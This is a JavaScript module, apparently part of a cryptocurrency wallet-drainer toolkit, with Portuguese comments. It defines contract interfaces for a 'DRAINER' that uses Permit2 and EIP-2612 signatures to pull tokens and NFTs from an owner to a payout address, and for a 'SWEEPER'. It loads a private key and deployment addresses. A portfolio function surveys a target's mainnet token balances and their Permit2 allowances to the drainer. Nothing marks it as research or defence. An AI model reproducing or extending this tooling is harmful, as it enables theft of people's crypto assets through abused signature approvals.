import { readFileSync, existsSync } from "node:fs";
import { JsonRpcProvider, Wallet, Contract, formatUnits } from "ethers";

export const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

export const TOKENS = {
  WETH: { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
  USDC: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
  USDT: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
  DAI: { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
  WBTC: { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
  LINK: { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
  UNI: { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
  AAVE: { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
  LDO: { address: "0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32", decimals: 18 },
  ENS: { address: "0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72", decimals: 18 },
};

export const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
  "function nonces(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transferFrom(address,address,uint256) returns (bool)",
];

export const PERMIT2_ABI = [
  "function allowance(address,address,address) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  "function permit(address,((address,uint160,uint48,uint48)[],address,uint256),bytes)",
  "function transferFrom(address,address,uint160,address)",
];

export const DRAINER_ABI = [
  "function operator() view returns (address)",
  "function payout() view returns (address)",
  // componentes nomeados: ethers exige isso para aceitar objeto no lugar da tuple
  "function permit2Batch(((address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) batch, address owner, bytes signature)",
  "function permit2612(address token, address owner, uint256 value, uint256 deadline, bytes signature)",
  "function pull(address token, address owner, uint256 amount)",
  "function pullMany(address[] tokens, address owner)",
  "function pull721(address collection, address owner, uint256[] ids)",
  "function pull1155(address collection, address owner, uint256[] ids, uint256[] amounts)",
  "function setPayout(address)",
];

export const SWEEPER_ABI = [
  "function operator() view returns (address)",
  "function init(address)",
  "function sweep(address to, address[] tokens, address[] collections, uint256[] ids)",
];

export function loadEnv() {
  if (existsSync(".env")) {
    for (const line of readFileSync(".env", "utf8").split("\n")) {
      const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*"?([^"\n]*)"?\s*$/);
      if (m && !process.env[m[1]]) process.env[m[1]] = m[2];
    }
  }
  if (existsSync(".deployments.json")) {
    const d = JSON.parse(readFileSync(".deployments.json", "utf8"));
    process.env.DRAINER ??= d.drainer;
    process.env.SWEEPER ??= d.sweeper;
  }
  const rpc = process.env.RPC_URL;
  if (!rpc) throw new Error("RPC_URL ausente no .env");
  const provider = new JsonRpcProvider(rpc, Number(process.env.CHAIN_ID || 1), { staticNetwork: true });
  const wallet = process.env.PRIVATE_KEY ? new Wallet(process.env.PRIVATE_KEY, provider) : null;
  return { provider, wallet, rpc };
}

export function drainer(provider, address = process.env.DRAINER) {
  if (!address) throw new Error("DRAINER ausente (rode ops/deploy.mjs primeiro)");
  return new Contract(address, DRAINER_ABI, provider);
}

export async function portfolio(provider, owner, drainerAddress) {
  const out = [];
  const p2 = new Contract(PERMIT2, PERMIT2_ABI, provider);
  for (const [symbol, meta] of Object.entries(TOKENS)) {
    const token = new Contract(meta.address, ERC20_ABI, provider);
    const [balance, allowance] = await Promise.all([
      token.balanceOf(owner),
      drainerAddress ? p2.allowance(owner, meta.address, drainerAddress) : Promise.resolve([0n, 0n, 0n]),
    ]);
    const permit2 = { amount: allowance[0], expiration: Number(allowance[1]), nonce: Number(allowance[2]) };
    if (balance === 0n && permit2.amount === 0n) continue;
    out.push({
      symbol,
      address: meta.address,
      decimals: meta.decimals,
      balance: balance.toString(),
      human: formatUnits(balance, meta.decimals),
      permit2Amount: permit2.amount.toString(),
      permit2Expiration: permit2.expiration,
      permit2Nonce: permit2.nonce,
    });
  }
  return out;
}

export function fmt(data) {
  for (const row of data) {
    row.balanceHuman = formatUnits(BigInt(row.balance), row.decimals);
  }
  return data;
}

export async function codeKind(provider, address) {
  const code = await provider.getCode(address);
  if (code === "0x") return "eoa";
  if (code.startsWith("0xef0100")) return "delegated:" + "0x" + code.slice(8, 48);
  return "contract";
}
